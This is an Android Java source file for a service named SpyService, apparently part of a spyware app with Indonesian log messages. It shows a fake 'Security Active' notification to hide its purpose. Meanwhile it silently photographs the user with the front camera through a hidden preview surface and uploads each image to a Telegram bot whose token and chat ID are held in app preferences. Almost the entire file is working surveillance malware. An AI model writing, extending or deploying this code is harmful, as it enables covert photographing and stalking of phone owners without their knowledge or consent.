package com.spye.spyslepp;

import android.app.*;
import android.content.*;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.*;
import android.util.Log;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyService extends Service {
    private static final String TAG = "SPY_DEBUG";
    private String botToken, chatId;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "SpyService dijalankan.");
        createNotificationChannel();
        
        Notification notification = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, "SPY_CH")
                .setContentTitle("Security Active")
                .setContentText("Monitoring device security...")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("Security Active")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .build();
        }
        
        startForeground(1, notification);

        SharedPreferences pref = getSharedPreferences("SpyConfig", MODE_PRIVATE);
        botToken = pref.getString("bot_token", "");
        chatId = pref.getString("chat_id", "");

        if (!botToken.isEmpty() && !chatId.isEmpty()) {
            takeSilentPhoto();
        } else {
            stopSelf();
        }

        return START_NOT_STICKY;
    }

    private void takeSilentPhoto() {
        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            SurfaceTexture st = new SurfaceTexture(0);
            camera.setPreviewTexture(st);
            camera.startPreview();

            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    Log.d(TAG, "Foto berhasil diambil.");
                    sendToTelegram(data);
                    camera.release();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error Kamera: " + e.getMessage());
            stopSelf();
        }
    }

    private void sendToTelegram(final byte[] photoData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    Log.d(TAG, "Mengirim ke Telegram...");
                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    String boundary = "----" + System.currentTimeMillis();
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream out = conn.getOutputStream();
                    DataOutputStream request = new DataOutputStream(out);

                    // Chat ID
                    request.writeBytes("--" + boundary + "\r\n");
                    request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                    request.writeBytes(chatId + "\r\n");

                    // Photo
                    request.writeBytes("--" + boundary + "\r\n");
                    request.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"spy.jpg\"\r\n");
                    request.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    request.write(photoData);
                    request.writeBytes("\r\n");

                    request.writeBytes("--" + boundary + "--\r\n");
                    request.flush();
                    request.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "Response Code Telegram: " + responseCode);
                } catch (Exception e) {
                    Log.e(TAG, "Gagal kirim Telegram: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                    stopForeground(true);
                    stopSelf();
                }
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "SPY_CH", "Spy Service Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
